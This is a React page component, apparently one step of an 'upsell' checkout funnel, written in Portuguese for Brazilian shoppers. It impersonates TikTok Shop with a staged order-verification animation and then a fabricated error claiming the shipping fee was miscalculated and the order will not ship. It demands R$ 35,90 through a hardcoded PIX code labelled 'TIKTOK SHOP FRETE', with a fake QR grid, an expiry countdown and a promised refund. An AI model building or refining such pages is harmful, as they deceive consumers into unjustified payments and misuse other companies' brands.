import { useState, useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { X, Copy, Clock, Loader2, Check, AlertTriangle } from "lucide-react";
import { toast } from "sonner";
import { Button } from "@/components/ui/button";
import { Progress } from "@/components/ui/progress";
import tiktokLogo from "@/assets/upsell/tiktok-shop.png";
import slimhealthLogo from "@/assets/slimhealth-logo.png";
import cimedLogo from "@/assets/cimed-logo.png";

const Upsell3Page = () => {
  const navigate = useNavigate();
  const card3Ref = useRef<HTMLDivElement>(null);
  
  // Phase control
  const [phase, setPhase] = useState<'verification' | 'cards'>('verification');
  const [progress, setProgress] = useState(0);
  const [statusText, setStatusText] = useState('Processando...');
  
  // Cards visibility
  const [visibleCards, setVisibleCards] = useState({
    card1: false,
    card2: false,
    card3: false,
  });
  
  // Modal state
  const [showModal, setShowModal] = useState(false);
  const [timeLeft, setTimeLeft] = useState(900);

  // PIX code placeholder
  const pixCode = "00020101021226940014br.gov.bcb.pix2572qrcodespix.sejaefi.com.br/v2/cobfc73d8f1cc9a469c7b33e0e5d0e08a675204000053039865802BR5925TIKTOK SHOP FRETE6009SAO PAULO62070503***6304";

  // Verification phase animation
  useEffect(() => {
    if (phase !== 'verification') return;

    // Progress bar animation
    const progressInterval = setInterval(() => {
      setProgress(prev => {
        if (prev >= 100) {
          clearInterval(progressInterval);
          return 100;
        }
        return prev + 3;
      });
    }, 100);

    // Status text changes
    const timer1 = setTimeout(() => setStatusText('Verificando dados...'), 1000);
    const timer2 = setTimeout(() => setStatusText('Quase pronto...'), 2000);
    const timer3 = setTimeout(() => setStatusText('Concluído!'), 2800);
    
    // Switch to cards phase
    const phaseTimer = setTimeout(() => {
      setPhase('cards');
    }, 3500);

    return () => {
      clearInterval(progressInterval);
      clearTimeout(timer1);
      clearTimeout(timer2);
      clearTimeout(timer3);
      clearTimeout(phaseTimer);
    };
  }, [phase]);

  // Cards sequential appearance
  useEffect(() => {
    if (phase !== 'cards') return;

    const card1Timer = setTimeout(() => {
      setVisibleCards(prev => ({ ...prev, card1: true }));
    }, 100);

    const card2Timer = setTimeout(() => {
      setVisibleCards(prev => ({ ...prev, card2: true }));
    }, 2000);

    const card3Timer = setTimeout(() => {
      setVisibleCards(prev => ({ ...prev, card3: true }));
      // Scroll to card 3
      setTimeout(() => {
        card3Ref.current?.scrollIntoView({ behavior: 'smooth', block: 'center' });
      }, 300);
    }, 4000);

    return () => {
      clearTimeout(card1Timer);
      clearTimeout(card2Timer);
      clearTimeout(card3Timer);
    };
  }, [phase]);

  // Modal timer
  useEffect(() => {
    if (!showModal) return;
    
    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, [showModal]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const handleCopyPix = async () => {
    try {
      await navigator.clipboard.writeText(pixCode);
      toast.success("Código PIX copiado!");
    } catch {
      toast.error("Erro ao copiar código");
    }
  };

  const handleOpenModal = () => {
    setTimeLeft(900);
    setShowModal(true);
  };

  const handleSimulatePayment = () => {
    toast.success("Pagamento confirmado!");
    setShowModal(false);
    // Navigate to Upsell 4
    navigate("/upsell4");
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Header */}
      <div className="bg-white px-4 py-4 flex justify-center">
        <img src={tiktokLogo} alt="TikTok Shop" className="h-10 w-auto" />
      </div>

      {/* Verification Phase */}
      {phase === 'verification' && (
        <div className="flex-1 flex flex-col items-center justify-center p-6">
          <div className="w-full max-w-md text-center space-y-6">
            {/* Animated check icon */}
            <div className="flex justify-center">
              <div className="w-20 h-20 rounded-full flex items-center justify-center
                bg-gradient-to-br from-rose-400 to-rose-600
                shadow-[0_8px_24px_rgba(244,63,94,0.4)]
                animate-pulse">
                <Check className="w-10 h-10 text-white" />
              </div>
            </div>

            <div>
              <h1 className="text-2xl font-extrabold text-[#1a1a2e] mb-2">
                Seu pedido foi concluído!
              </h1>
              <p className="text-gray-600">
                Aguarde enquanto realizamos a verificação do pedido...
              </p>
            </div>

            {/* Progress bar */}
            <div className="space-y-2">
              <Progress value={progress} className="h-3 bg-rose-100" />
              <p className="text-sm text-gray-500 font-medium">{statusText}</p>
            </div>
          </div>
        </div>
      )}

      {/* Cards Phase */}
      {phase === 'cards' && (
        <div className="flex-1 flex flex-col items-center p-4">
          <div className="w-full max-w-md space-y-4">
            
            {/* Card 1 - Success */}
            {visibleCards.card1 && (
              <div className="bg-white rounded-2xl shadow-lg p-6 animate-card-slide-up">
                <div className="flex items-start gap-4">
                  <div className="w-14 h-14 rounded-full flex items-center justify-center flex-shrink-0
                    bg-gradient-to-br from-emerald-400 to-emerald-600
                    shadow-[0_4px_12px_rgba(16,185,129,0.4)]">
                    <Check className="w-7 h-7 text-white" />
                  </div>
                  <div className="flex-1">
                    <h2 className="font-bold text-[#1a1a2e] text-lg">Pedido Concluído com Sucesso</h2>
                    <p className="text-sm text-gray-500 mt-1">Aguarde um momento...</p>
                  </div>
                </div>
              </div>
            )}

            {/* Card 2 - Warning */}
            {visibleCards.card2 && (
              <div className="bg-white rounded-2xl shadow-lg p-6 animate-card-slide-up">
                <div className="flex items-start gap-4">
                  <div className="w-14 h-14 rounded-full flex items-center justify-center flex-shrink-0
                    bg-gradient-to-br from-amber-400 to-amber-500
                    shadow-[0_4px_12px_rgba(245,158,11,0.4)]">
                    <AlertTriangle className="w-7 h-7 text-white" />
                  </div>
                  <div className="flex-1">
                    <h2 className="font-bold text-[#1a1a2e] text-lg">Validação do CEP para Entrega</h2>
                    <p className="text-sm text-gray-500 mt-1">Estamos verificando as informações...</p>
                  </div>
                </div>
              </div>
            )}

            {/* Card 3 - Error (Highlight) */}
            {visibleCards.card3 && (
              <div 
                ref={card3Ref}
                className="bg-white rounded-2xl shadow-lg p-6 border-2 border-rose-500 animate-card-slide-up"
              >
                <div className="flex items-start gap-4">
                  <div className="w-14 h-14 rounded-full flex items-center justify-center flex-shrink-0
                    bg-gradient-to-br from-rose-500 to-rose-600
                    shadow-[0_4px_12px_rgba(244,63,94,0.4)]">
                    <X className="w-7 h-7 text-white" />
                  </div>
                  <div className="flex-1">
                    <h2 className="font-bold text-[#1a1a2e] text-lg">
                      O valor do Frete foi calculado errado para sua região
                    </h2>
                    <p className="text-sm text-gray-500 mt-1">
                      O pedido não será enviado. Faça a correção do frete para finalizar.
                    </p>
                  </div>
                </div>

                {/* Pay button */}
                <Button
                  onClick={handleOpenModal}
                  className="w-full mt-4 bg-gradient-to-r from-rose-500 to-rose-600 hover:from-rose-600 hover:to-rose-700 text-white font-bold py-4 rounded-xl shadow-lg text-lg h-auto"
                >
                  PAGAR FRETE - R$ 35,90
                </Button>

                {/* Refund notice */}
                <div className="mt-4 bg-rose-50 rounded-lg p-3 text-center">
                  <p className="text-sm text-rose-600 font-medium">
                    O valor pago do frete anterior será reembolsado
                  </p>
                </div>
              </div>
            )}

            {/* Footer logos */}
            {visibleCards.card3 && (
              <div className="flex items-center justify-center gap-3 mt-6 mb-8 animate-card-slide-up">
                <img 
                  src={slimhealthLogo} 
                  alt="SlimHealth" 
                  className="h-7 object-contain opacity-70"
                />
                <span className="text-lg font-bold text-muted-foreground">+</span>
                <img 
                  src={cimedLogo} 
                  alt="CIMED" 
                  className="h-5 object-contain opacity-70"
                />
              </div>
            )}
          </div>
        </div>
      )}

      {/* Payment Modal */}
      {showModal && (
        <div 
          className="fixed inset-0 z-50 bg-black/60 flex items-center justify-center p-4"
          onClick={() => setShowModal(false)}
        >
          <div 
            className="bg-white w-full max-w-sm rounded-2xl overflow-hidden shadow-2xl"
            onClick={(e) => e.stopPropagation()}
          >
            {/* Modal Header */}
            <div className="bg-white px-4 py-3 flex items-center justify-between">
              <div className="w-8" />
              <img src={tiktokLogo} alt="TikTok Shop" className="h-8 w-auto" />
              <button 
                onClick={() => setShowModal(false)}
                className="w-8 h-8 flex items-center justify-center rounded-full hover:bg-gray-100 transition-colors"
              >
                <X className="w-5 h-5 text-gray-500" />
              </button>
            </div>

            {/* Modal Content */}
            <div className="p-6">
              {/* Title and Value */}
              <div className="text-center mb-4">
                <p className="text-gray-500 text-sm font-medium">Correção de Frete</p>
                <p className="text-3xl font-bold text-gray-900 mt-1">R$ 35,90</p>
              </div>

              {/* QR Code */}
              <div className="flex justify-center mb-4">
                <div className="w-48 h-48 bg-gray-100 border-2 border-gray-200 rounded-lg flex items-center justify-center">
                  <div className="w-36 h-36 bg-gray-200 rounded grid grid-cols-6 grid-rows-6 gap-0.5 p-2">
                    {Array.from({ length: 36 }).map((_, i) => (
                      <div 
                        key={i} 
                        className={`rounded-sm ${Math.random() > 0.4 ? 'bg-gray-800' : 'bg-white'}`}
                      />
                    ))}
                  </div>
                </div>
              </div>

              {/* Copy Button */}
              <Button
                onClick={handleCopyPix}
                className="w-full bg-rose-500 hover:bg-rose-600 text-white font-semibold py-3 rounded-xl flex items-center justify-center gap-2"
              >
                <Copy className="w-5 h-5" />
                Copiar código PIX
              </Button>

              {/* Timer */}
              <div className="flex items-center justify-center gap-2 mt-4 text-amber-600">
                <Clock className="w-4 h-4" />
                <span className="text-sm font-medium">
                  O PIX expira em: <span className="font-bold">{formatTime(timeLeft)}</span>
                </span>
              </div>

              {/* Waiting confirmation */}
              <div className="flex items-center justify-center gap-2 mt-2 text-amber-600">
                <Loader2 className="w-4 h-4 animate-spin" />
                <span className="text-sm">Aguardando confirmação...</span>
              </div>

              {/* PIX code truncated */}
              <p className="text-xs text-gray-400 text-center mt-4 break-all line-clamp-2 px-2">
                {pixCode}
              </p>

              {/* Simulate payment button (for testing) */}
              <Button
                onClick={handleSimulatePayment}
                variant="outline"
                className="w-full mt-4 border-gray-300 text-gray-600 font-medium py-2 rounded-xl"
              >
                Simular Pagamento (Teste)
              </Button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default Upsell3Page;
